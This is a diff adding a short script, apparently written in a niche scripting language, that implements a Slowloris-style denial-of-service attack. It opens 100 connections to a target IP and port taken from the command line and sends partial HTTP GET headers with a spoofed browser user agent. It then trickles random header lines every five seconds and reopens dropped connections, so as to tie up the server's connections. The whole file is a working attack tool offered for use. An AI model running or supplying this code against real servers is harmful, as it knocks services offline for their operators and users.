@@ -1,0 +1,61 @@
+use Socket from Net;
+use Random from Math;
+
+func main (params args) {
+	conns = [];
+	thread do {
+		keepalive (conns);
+	}
+
+	attack (conns, args [1], args [2].toint (), 100);
+	
+	input ();
+}
+
+func keepalive (conns : list) {
+	while (true) {
+		println ("Sending keep alive for {0} connections!".format (conns.length));
+
+		for (i = 0; i < conns.length; i++) {
+			try {
+				conns [i].keepalive ();
+			} catch {
+				conns [i] = new Connection (conns [i].ip, conns [i].port);
+			}
+		}
+
+		sleep (5000);
+	}
+}
+
+func attack (conns : list, ip : string, port : int, threads : int) : null {
+	println ("Initializing {0} connections".format (threads));
+	for (i = 0; i < threads; i++) {
+		conn = new Connection (ip, port);
+		conn.sendheaders ("Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0");
+		conns.add (conn);
+	}
+}
+
+class Connection {
+	func new (ip : string, port : int) {
+		this.ip = ip;
+		this.port = port;
+	
+		this.sock = new Socket (ip, port);
+
+		this.rnd = new Random ();
+	}
+
+	func keepalive () : null {
+		this.sock.writeline ("X-a: {0}\r\n".format (this.rnd.randint (1, 5000)));
+	}
+
+	func sendheaders (uagent : string) : null {
+		this.sock.writeline ("GET /?{0} HTTP/1.1\r\n".format (this.rnd.randint (1, 2000)));
+		this.sock.writeline ("{0}\r\n".format (uagent));
+		this.sock.writeline ("Accept-language: en-US,en,q=0.5\r\n");
+	}
+
+	
+}
